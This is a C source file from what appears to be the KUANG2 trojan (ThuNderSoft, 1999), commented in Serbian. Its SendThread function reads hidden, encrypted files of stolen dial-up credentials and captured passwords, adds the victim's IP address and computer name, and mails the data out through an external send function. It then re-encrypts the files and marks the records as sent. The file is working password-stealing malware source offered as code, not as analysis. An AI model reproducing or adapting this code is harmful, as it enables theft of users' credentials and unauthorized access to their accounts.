/***[ThuNderSoft]*************************************************************
								 KUANG2: thread
								   ver: 0.15
								     WEIRD
*****************************************************************************/

/* HISTORY */
// ver 0.15 (26-feb-1999): slanje pass podataka
// ver 0.10 (03-feb-1999): born code

#include <windows.h>
#include <win95e.h>
#include <strmem.h>
#include <tools.h>

#define KUANG_SEED 0x17317373

extern char sysfile[];
extern char dl_name[];
extern char buff[];
extern int send_data(char *);
extern char lastIP[];
extern char tempIP[];
extern char compname[];
extern volatile BOOL unutra;

extern BOOL SENDdunOK;
extern BOOL SENDpassOK;

extern BOOL WriteRasData(char*);

char newtag[]="-----\r\n";

/*
	SendThread
	----------
  + thread koji šalje sve podatke: i dun i pass
  + u buff (len <= 5KB) se nalazi novi dun string. */

DWORD WINAPI SendThread (LPVOID param)
{
	HANDLE hfajl;
	unsigned int fsize, i, k, j;
	DWORD procitano;
	char *fbafer;
	BOOL novizapis;
	BOOL rasnovizapis;

//if (SENDdunOK) MsgBox("dunOK"); else MsgBox("dunNOT");
//if (SENDpassOK) MsgBox("passOK"); else MsgBox("passNOT");

/*** DUN PODACI ***/
// proverava se da li novi zapis već postoji!

	if (SENDdunOK) goto onlypass;		// ako su u trenutnom uključenju na internet dun podaci već poslati, idi dalje

	// otvori fajl
	hfajl=CreateFile(sysfile, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_ARCHIVE | FILE_ATTRIBUTE_HIDDEN, NULL);
	if (hfajl==INVALID_HANDLE_VALUE) goto kraj1;		// nešto nije u redu

	// alociraj memoriju veličine fajla + veličine bafera
	fsize=GetFileSize(hfajl, NULL);
	fbafer=(char *)GlobalAlloc (GMEM_FIXED | GMEM_ZEROINIT, fsize+strlengthF(buff)+5124);
	if (fbafer==NULL) goto kraj2;		// alloc error

	if (fsize)	{						// ako sadržaj fajla postoji
		ReadFile(hfajl, fbafer, fsize, &procitano, NULL);	// onda ga učitaj
		strdecrypt(fbafer, KUANG_SEED);						// i dekriptuj
	}

	novizapis=FALSE;	// nema novog zapisa

	// ako je buf prazan, što se dešava kad se korisnik alternativno loguje
	// na net onda upiši u bafer neki string da ne bi kuang2 stalno registrovao ovakvo logovanje
	if (!buff[0]) strcopyF(buff, "alternate\r\n");

	if (!strfind(fbafer, buff)) {	// u 'buff' su podaci o trenutnom logovanju
		novizapis=TRUE;				// nije našao je podatke, znači novi su
		straddF(fbafer, buff);		// dodaj ih u fajl bafer
	}

	rasnovizapis = WriteRasData(fbafer);	// dodaj i sve ostale passworde
	novizapis |= rasnovizapis;

	if (!novizapis) {		// ako je već sve bilo izađi, tj nema ništa novo
		SENDdunOK=TRUE;		// sve je bilo ok
		goto kraj3;
	}

	// nije našao podatke, šalji nove...
	j=strlengthF(buff);
	straddFaddd(buff, tempIP, 0x0A0D);		// dodaj trenutni IP samo na ono što se šalje
	straddFaddd(buff, compname, 0x0A0D);	// dodaj ComputerName samo na ono što se šalje

#define		notsendOK		fsize
//MsgBox(buff);
	// pošalji!
	notsendOK=send_data(buff);				// slanje bafera na mail
	buff[j]=0;

//if (notsendOK) MsgBox("dun NIJE POSLATO!");
//else MsgBox("dun POSLATO!");

	if (!notsendOK) {					// ako je sve prošlo OK idi snimi
		strcrypt(fbafer, KUANG_SEED);	// kriptovanje celog bafera
		SetFilePointer(hfajl, 0, NULL, FILE_BEGIN); // idi na početak fajla
		WriteFile(hfajl, fbafer, strlengthF(fbafer)+1, &procitano, NULL); // snimi + snimi zadnju 0
		SENDdunOK=TRUE;
	}

kraj3:
	GlobalFree(fbafer);			// zatvori bafer
kraj2:
	CloseHandle(hfajl);			// zatvori fajl
kraj1:






/*** PASS PODACI ***/
// Oni se šalju uvek kada postoji novi zapis.
// Ne proverava se da li novi zapis već postoji!

onlypass:
	if (SENDpassOK) goto exit1; // ako su u trenutnom uključenju na internet pass podaci već poslati, izađi

	// otvori fajl
	hfajl=CreateFile(dl_name, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE , NULL, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE | FILE_ATTRIBUTE_HIDDEN, NULL);
	if (hfajl==INVALID_HANDLE_VALUE) goto exit1;		// nešto nije u redu ili fajl još ne postoji
	fsize=GetFileSize(hfajl, NULL);
	if (!fsize) goto exit2;			// ako je veličina fajla 0??? izađi

	// alociraj memoriju veličine bafera i malko više
	fbafer=(char *)GlobalAlloc (GMEM_FIXED | GMEM_ZEROINIT, fsize+20);
	if (fbafer==NULL) goto exit2;	// alloc error

	ReadFile(hfajl, fbafer, fsize, &procitano, NULL);	// učitaj ga
	fbafer[fsize]=0;				// zatvori string
	strdecryptS(fbafer);			// i dekriptuj

	k=strfind(fbafer, newtag);	// nađi novi tag
	if (!k) {
		SENDpassOK=TRUE;		// k==0, znači nije ga našao, izađi
		goto exit3;				// k<>0, znači našao ga je, sada fbafer[i]==newtag;
	}
	i=k-1;


	// dodaj samo još ComputerName na kraj zapisa!
	j=strlengthF(fbafer);
	straddF(fbafer, "# ");
	straddF(fbafer, compname);			// dodaj ComputerName
//MsgBox(&fbafer[i]);
	notsendOK=send_data(&fbafer[i]);	// slanje bafera na mail
	fbafer[j]=0;						// izbriši ComputerName

//if (notsendOK) MsgBox("pass NIJE POSLATO!");
//else MsgBox("pass POSLATO!");

	if (!notsendOK) {					// ako je sve prošlo OK idi snimi
		while (k) {							// promeni sve tagove!
			fbafer[i]=0x2B;					// promeni tag da se označi da je poslato
			k=strfind(&fbafer[i], newtag);	// nađi sledeći tag
			i+=(k-1);
		}
		strcryptS(fbafer);					// kriptovanje celog bafera
		SetFilePointer(hfajl, 0, NULL, FILE_BEGIN); // idi na početak fajla
		WriteFile(hfajl, fbafer, strlengthF(fbafer), &procitano, NULL); // snimi (bez poslednje 0)
		SENDpassOK=TRUE;
	}

exit3:
	GlobalFree(fbafer);				// zatvori bafer
exit2:
	CloseHandle(hfajl);				// zatvori fajl
exit1:

	if (SENDdunOK) {
		buff[0]=0;		// obriši buf
		if (SENDpassOK) {				// ako su poslati svi podaci
			strcopyF(lastIP, tempIP);	// zapamti trenutni IP da ne bi sledeći put sve proveravali ponovo
		}
	}

//	if (SENDdunOK) MsgBox("dunOK"); else MsgBox("dunNOT");
//	if (SENDpassOK) MsgBox("passOK"); else MsgBox("passNOT");

	unutra=FALSE;					// nismo više unutar thread-a
	return 0;
}
